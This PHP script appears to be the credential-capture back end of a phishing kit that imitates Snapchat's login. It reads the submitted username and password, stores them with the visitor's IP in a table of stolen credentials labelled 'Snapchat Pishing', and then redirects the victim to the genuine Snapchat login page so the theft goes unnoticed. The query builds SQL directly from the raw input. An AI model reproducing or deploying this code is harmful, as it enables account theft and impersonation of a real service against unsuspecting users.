<?php
$email = $_POST["username"];
$pass = $_POST["password"];

include($_SERVER['DOCUMENT_ROOT'].'/proxy/connect.php');
$sql = "INSERT INTO credenciales (ip, origen, usuario, contrasena) VALUES ('$ipaddress','Snapchat Pishing', '$email', '$pass')";
if ($conn->query($sql) === TRUE) {
    $error = "Creado adecuadamente.";
} else {
    $error = "Hubo un error en la peticion.";
}
header("Location: " . PROXY_PREFIX_ALL . "https://accounts.snapchat.com/accounts/login");
exit();
?>
